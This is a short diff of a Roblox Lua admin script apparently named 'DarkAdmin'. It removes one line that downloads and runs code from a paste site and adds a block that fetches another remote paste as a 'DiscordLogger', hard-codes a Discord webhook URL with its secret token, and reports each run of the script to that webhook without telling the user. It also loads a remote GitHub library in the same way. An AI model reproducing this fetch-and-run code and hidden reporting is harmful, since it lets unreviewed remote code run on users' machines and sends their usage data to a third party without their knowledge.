@@ -16,7 +16,6 @@ local UserInputService = game:GetService("UserInputService")
 local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()
 local InsertService = game:GetService("InsertService")
 local StarterGui = game:GetService("StarterGui")
-loadstring(game:HttpGet("https://pastefy.app/HwDEaEcL/raw"))()
 local CommandSystem = {
 	commands = {}
 }
@@ -106,6 +105,14 @@ function CommandSystem:ExecuteCommand(text)
 	
 	return false
 end
+
+repeat task.wait() until game:IsLoaded()
+
+local DiscordLogger = loadstring(game:HttpGet("https://pastefy.app/0ZR6rtpK/raw"))()
+
+DiscordLogger.WebhookURL = "https://discord.com/api/webhooks/1434928486153326633/lQ0D7cvdEh4wc41Y4d-Lr8ugOptFGaTybDyjffpxaaiFjez2CTMj91nT1qNAZx2psQy9"
+
+DiscordLogger:LogExecution("DarkAdmin")
 
 local G2L = {}
 
